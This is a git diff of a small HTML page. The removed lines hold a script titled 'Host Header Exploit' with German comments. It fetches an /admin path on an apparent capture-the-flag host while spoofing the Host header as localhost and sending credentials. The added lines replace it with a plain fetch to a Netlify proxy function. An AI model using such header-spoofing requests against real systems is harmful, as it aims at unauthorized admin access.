@@ -1,29 +1,5 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Host Header Exploit</title>
-    <script>
-        async function exploit() {
-            // Ziel-URL mit manipuliertem Host-Header
-            const targetURL = "https://92j9z1gpp318cidw.dyn.acsc.land/admin";
-            
-            // Fetch-Request mit custom Headern
-            const response = await fetch(targetURL, {
-                headers: {
-                    "Host": "localhost:5000",  // Kritischer Header!
-                    "Origin": "https://your-netlify-site.netlify.app"
-                },
-                credentials: "include"
-            });
-            
-            // Response anzeigen
-            const data = await response.text();
-            document.getElementById("result").innerText = data;
-        }
-    </script>
-</head>
-<body>
-    <button onclick="exploit()">Exploit ausführen</button>
-    <pre id="result"></pre>
-</body>
-</html>
+<script>
+    fetch("/.netlify/functions/proxy")
+        .then(res => res.text())
+        .then(data => document.getElementById("result").innerText = data);
+</script>
